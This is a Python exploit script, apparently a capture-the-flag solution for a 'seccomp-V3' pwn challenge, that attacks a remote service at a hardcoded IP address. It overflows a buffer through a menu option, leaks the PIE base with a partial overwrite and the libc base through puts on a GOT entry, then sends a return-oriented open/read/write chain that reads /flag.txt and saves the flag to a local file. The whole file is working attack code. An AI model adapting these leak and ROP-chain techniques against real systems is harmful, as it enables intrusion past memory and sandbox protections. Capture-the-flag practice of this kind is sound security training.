#!/usr/bin/env python3
"""seccomp-V3 remote exploit — based on the proven fingerprint.py PIE-leak path."""
import socket, struct, time, re, sys

HOST = "144.79.188.39"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 44942

# binary
INIT_ARRAY = 0x3d40; FRAME_DUMMY = 0x1c10
GOT_PUTS = 0x3f60; PLT_PUTS = 0x1154
PLT_OPEN = 0x1214; PLT_READ = 0x1184; PLT_EXIT = 0x1234
BSS = 0x4220; MAIN = 0x1240; RET = 0x101a
POP_RDI = 0x145b; POP_RSI_R15 = 0x1459
# remote libc (2.35, .text shifted -0x40 vs local)
PUTS_OFF = 0x80e10
POP_RDX_RBX_OFF = 0x90469

def p64(x): return struct.pack("<Q", x)
def p16(x): return struct.pack("<H", x)
def u64(b): return struct.unpack("<Q", b.ljust(8, b"\x00"))[0]

def recvu(s, d, t=6):
    s.settimeout(t); data=b""
    while d not in data:
        try:
            c=s.recv(4096)
        except socket.timeout:
            break
        if not c: break
        data+=c
    return data
def recvall(s, t=2):
    s.settimeout(t); data=b""
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            data+=c
    except socket.timeout: pass
    return data

def audit(s, payload):
    s.sendall(b"5\n"); recvu(s, b"size?\n")
    s.sendall(b"65600\n"); recvu(s, b"note?\n")
    s.sendall(payload)

for attempt in range(400):
    try:
        s=socket.socket(); s.settimeout(12); s.connect((HOST, PORT))
    except Exception as e:
        if attempt % 20 == 0: print(f"[{attempt}] connect exc {e!r}", flush=True)
        continue
    recvu(s, b"-1) exit\n")

    # ---- Stage 0: leak PIE ----
    audit(s, b"A"*0x70 + p16(INIT_ARRAY)); time.sleep(0.3)
    out=recvall(s, 2)
    leak=b""
    if b" 4) Probe\n" in out:
        rest=out.split(b" 4) Probe\n",1)[1]
        leak=rest.split(b"-1) exit",1)[0] if b"-1) exit" in rest else rest
    if len(leak)<6:
        s.close(); continue
    pie=u64(leak[:6])-FRAME_DUMMY
    if pie & 0xfff:
        s.close(); continue

    # ---- Stage 1: leak libc via puts(GOT.puts), return to main ----
    s1=b"A"*0x68+p64(pie+BSS)+p64(0)+p64(pie+RET)+p64(pie+POP_RDI)+p64(pie+GOT_PUTS)+p64(pie+PLT_PUTS)+p64(pie+MAIN)
    audit(s, s1); time.sleep(0.4)
    lk=recvall(s, 2.5)
    libc=u64(lk[:6])-PUTS_OFF
    if libc & 0xfff or not (0x700000000000 <= libc <= 0x800000000000):
        print(f"[{attempt}] pie={hex(pie)} libc-bad lk={lk[:20]!r}", flush=True)
        s.close(); continue

    # ---- Stage 2: ORW (menu already reprinted & consumed by recvall above) ----
    pop_rdx = libc + POP_RDX_RBX_OFF
    bp = pie+BSS; bb = pie+BSS+0x30
    orw = (p64(pie+POP_RDI)+p64(0)+p64(pie+POP_RSI_R15)+p64(bp)+p64(0)+p64(pop_rdx)+p64(16)+p64(0)+p64(pie+PLT_READ)+
           p64(pie+POP_RDI)+p64(bp)+p64(pie+POP_RSI_R15)+p64(0)+p64(0)+p64(pie+PLT_OPEN)+
           p64(pie+POP_RDI)+p64(3)+p64(pie+POP_RSI_R15)+p64(bb)+p64(0)+p64(pop_rdx)+p64(0x100)+p64(0)+p64(pie+PLT_READ)+
           p64(pie+POP_RDI)+p64(bb)+p64(pie+PLT_PUTS)+p64(pie+PLT_EXIT))
    s2=b"A"*0x68+p64(bp)+p64(0)+p64(pie+RET)+orw
    audit(s, s2); time.sleep(0.3)
    s.sendall(b"/flag.txt\x00"+b"\x00"*6); time.sleep(0.8)
    out=recvall(s, 4)
    s.close()
    m=re.search(rb"PTITCTF\{[^}]+\}", out)
    print(f"[{attempt}] pie={hex(pie)} libc={hex(libc)} => {m.group(0).decode() if m else 'no flag'} out={out[:120]!r}", flush=True)
    if m:
        open(r"D:\download\CTFTimeWriteup\PTITCTF2026\Pwn\seccomp-V3\final_flag.txt","w").write(m.group(0).decode()+"\n")
        break
